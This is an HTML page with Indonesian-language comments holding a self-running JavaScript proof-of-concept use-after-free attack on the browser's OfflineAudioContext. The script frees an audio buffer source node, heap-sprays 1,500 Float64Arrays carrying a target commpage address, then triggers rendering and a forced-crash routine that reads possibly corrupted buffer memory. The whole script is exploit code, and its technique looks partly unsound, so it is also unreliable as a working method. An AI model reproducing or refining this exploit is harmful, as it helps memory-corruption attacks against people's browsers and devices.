<!DOCTYPE html>
<html>
<head>
    <title>OfflineAudioContext UAF (Synchronous Attack) - Log Penuh</title>
    <style>
        #log-area {
            border: 1px solid #ccc;
            padding: 10px;
            margin-top: 15px;
            max-height: 400px;
            overflow-y: scroll;
            font-family: monospace;
            font-size: 12px;
            background-color: #f9f9f9;
        }
        .log-init { color: blue; }
        .log-info { color: black; }
        .log-spray { color: purple; }
        .log-critical { color: red; font-weight: bold; }
        .log-success { color: green; font-weight: bold; }
    </style>
</head>
<body>

    <h1>OfflineAudioContext UAF (Sinkron Agresif)</h1>
    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
    <p id="status" class="log-init">INIT: Mempersiapkan Audio Context Sinkron...</p>
    <div id="log-area"></div>

    <script>
        // --- KONSTANTA COMM PAGE ---
        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
        
        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);

        let startTime = performance.now();
        let offlineCtx = null;
        let victimNode = null;
        let payloadHolders = []; 

        // --- FUNGSI LOGGING DENGAN TIMESTAMP ---
        function log(message, type = 'log-info') {
            const timeElapsed = (performance.now() - startTime).toFixed(2);
            const logElement = document.getElementById('log-area');
            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
            logElement.scrollTop = logElement.scrollHeight;
        }
        
        // --- FUNGSI HEAP SPRAY PAYLOAD ---
        function sprayPayload() {
            log("Memulai Spraying Payload...", "log-spray");
            const SPRAY_COUNT = 1500;
            const PAYLOAD_SIZE = 64; 

            for (let i = 0; i < SPRAY_COUNT; i++) {
                let payloadArray = new Float64Array(PAYLOAD_SIZE);
                payloadArray[0] = HIGH_WORD; 
                payloadArray[1] = LOW_WORD;
                payloadArray[2] = 2028.0 + i; 
                payloadHolders.push(payloadArray); 
            }
            log(`Spray selesai. ${SPRAY_COUNT} Array dialokasikan.`, "log-spray");
        }

        // --- Trigger Alternatif (Dipanggil jika Render selesai tanpa crash) ---
        function triggerAlternativeCrash() {
             log("Memicu Trigger Alternatif...", "log-critical");
             
             // 1. Coba alokasi objek Web Audio yang sama
             let attackerCtx = new (window.AudioContext || window.webkitAudioContext)();
             let attackerBuffer = attackerCtx.createBuffer(1, 44100, 44100); 
             let attackerView = attackerBuffer.getChannelData(0);
             
             try {
                 // 2. Akses memori di alamat awal buffer yang sekarang mungkin berisi pointer rusak
                 let crashPtr = attackerView[0]; 
                 
                 log(`Membaca memori: 0x${crashPtr.toString(16)}`, "log-critical");

                 if (crashPtr.toFixed(0) === LOW_WORD.toString()) {
                     log("SUCCESS: Alamat Commpage Ditemukan di Pointer AudioBuffer!", "log-success");
                 }
                 
                 // 3. FORCE CRASH: Gunakan nilai pointer yang didapat
                 let crashNode = attackerCtx.createOscillator();
                 crashNode.frequency.value = crashPtr; 

             } catch(e) {
                 log(`JS Exception Terdeteksi: ${e.message}`, "log-critical");
                 document.getElementById('status').className = 'log-critical';
                 document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Menunggu Crash OS (EXC_BAD_ACCESS).';
             }
        }

        // --- FUNGSI UTAMA ATTACK ---
        function runOfflineAttack() {
            startTime = performance.now();
            log("Phase 1: Membuat OfflineAudioContext.", "log-init");
            
            try {
                offlineCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100 * 1, 44100); 
            } catch(e) {
                log(`ERROR: OfflineAudioContext gagal: ${e.message}`, "log-critical");
                return;
            }

            // 2. Alokasi Korban
            let buffer = offlineCtx.createBuffer(1, 44100, 44100);
            victimNode = offlineCtx.createBufferSource();
            victimNode.buffer = buffer;
            victimNode.connect(offlineCtx.destination);
            victimNode.start(0);

            log("Phase 2: Node Korban dibuat dan terhubung.", "log-info");

            // 3. FREE DAN SPRAY SINKRON AGRESIIF
            log("Phase 3: Memicu FREE dan SPRAY SINKRON...", "log-critical");
            
            // FREE:
            victimNode.disconnect(); 
            victimNode = null; 
            buffer = null;
            log("Node dan Buffer Referensi Dihapus.", "log-info");
            
            // SPRAY: Tepat setelah FREE (Hampir sinkron)
            sprayPayload(); 
            
            // 4. Memicu Trigger Cleanup/Dereference
            log("Phase 5: Memulai Render Sinkron...", "log-info");
            
            // Panggil render. Ini adalah titik trigger utama.
            offlineCtx.startRendering().then(() => {
                log("Render Selesai. Tidak ada crash di Audio Thread.", "log-info");
                triggerAlternativeCrash();
            }).catch(e => {
                log(`Render GAGAL (Potensi UAF/Corrupt): ${e.message}`, "log-critical");
                triggerAlternativeCrash();
            });

        }
        
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('status').textContent = 'Memulai rangkaian OfflineAudioContext...';
            setTimeout(runOfflineAttack, 50);
            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah FREE-SPRAY Sinkron.';
        });

    </script>
</body>
</html>
